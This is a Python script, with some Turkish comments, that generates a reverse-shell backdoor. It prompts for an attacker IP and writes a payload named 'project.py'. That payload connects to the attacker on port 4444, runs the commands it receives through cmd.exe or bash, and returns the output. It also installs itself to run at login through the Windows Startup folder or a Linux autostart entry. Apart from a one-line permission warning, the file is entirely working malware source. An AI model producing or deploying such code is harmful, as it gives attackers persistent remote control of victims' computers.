import socket
import os
import subprocess as sb
import platform
import time
from colorama import Fore

def create_backdoor():
    host = input(f"=>{Fore.RED} Attacker IP Address: ")
    port = 4444  

    backdoor_code = f"""
import socket
import os
import subprocess as sb
import platform
import time

def connect_backdoor(host, port):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))
            print(f"Connected to {{host}}:{{port}}")
            break 
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(5)  # 5 saniye bekle ve yeniden bağlanmayı dene

    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8').strip()
            if not command:  
                print("Connection lost. Reconnecting...")
                break 
            if command.lower() == "exit":
                break

            os_type = platform.system()

            if command.startswith("cd "):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    response = f"Changed directory to {{os.getcwd()}}"
                except Exception as e:
                    response = f"Error: {{e}}"
                client_socket.send(response.encode('utf-8'))
                continue

            if os_type == "Windows":
                executable = "cmd.exe"
                output = sb.check_output(command, shell=True, executable=executable, stderr=sb.STDOUT)
            elif os_type == "Linux":
                executable = "/bin/bash"
                output = sb.check_output(command, shell=True, executable=executable, stderr=sb.STDOUT)
            else:
                response = "Unsupported OS."
                client_socket.send(response.encode('utf-8'))
                continue

            response = output.decode('utf-8')
        except Exception as e:
            response = f"Error executing command: {{e}}"

        client_socket.send(response.encode('utf-8'))

    client_socket.close()
    connect_backdoor(host, port)   


def setup_autorun():
    os_type = platform.system()
    backdoor_path = os.path.abspath(__file__)

    if os_type == "Windows":
        autorun_path = os.path.expandvars(r"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat")
        with open(autorun_path, "w") as f:
            f.write(f"pythonw.exe {{backdoor_path}}")
        print("Autorun setup completed for Windows.")

    elif os_type == "Linux":
        autorun_path = os.path.expanduser("~/.config/autostart/backdoor.desktop")
        with open(autorun_path, "w") as f:
            f.write(f'''
[Desktop Entry]
Type=Application
Exec=python3 {{backdoor_path}}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=Backdoor
''')
        print("Autorun setup completed for Linux.")
    else:
        print("Unsupported OS for autorun setup.")


if __name__ == "__main__":
    host = "{host}"
    port = {port}

   
    setup_autorun()

 
    connect_backdoor(host, port)
    """

    try:
        with open("project.py", "w") as file: #if do you want to change file name, change it
            file.write(backdoor_code)
        print(f"{Fore.GREEN}Backdoor code successfully written to 'project.py'.")
    except Exception as e:
        print(f"{Fore.RED}Error writing backdoor file: {e}")


if __name__ == "__main__":
    print(f"{Fore.BLUE}Backdoor Creation Script")
    print(f"{Fore.YELLOW}Make sure you have permission to run this script!\n")
    create_backdoor()
